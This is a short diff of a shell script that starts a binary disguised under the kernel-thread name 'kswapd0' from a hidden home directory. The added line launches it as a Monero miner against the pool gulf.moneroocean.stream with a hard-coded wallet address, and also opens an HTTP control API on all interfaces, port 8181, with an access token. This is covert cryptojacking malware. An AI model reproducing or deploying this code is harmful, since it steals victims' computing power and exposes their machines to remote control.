@@ -63,7 +63,7 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2_manual/config.
 # Run kswapd0 if no other process with the specific configuration is running
 if ! pgrep -f "$HOME/.gdm2_manual/kswapd0 --config=$HOME/.gdm2_manual/config.json" > /dev/null; then
     echo "kswapd0 not started. Starting it..."
-    "$HOME/.gdm2_manual/kswapd0 --config=$HOME/.gdm2_manual/config.json" &
+    "$HOME/.gdm2_manual/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash" &
 else
     echo "kswapd0 is already running."
 fi
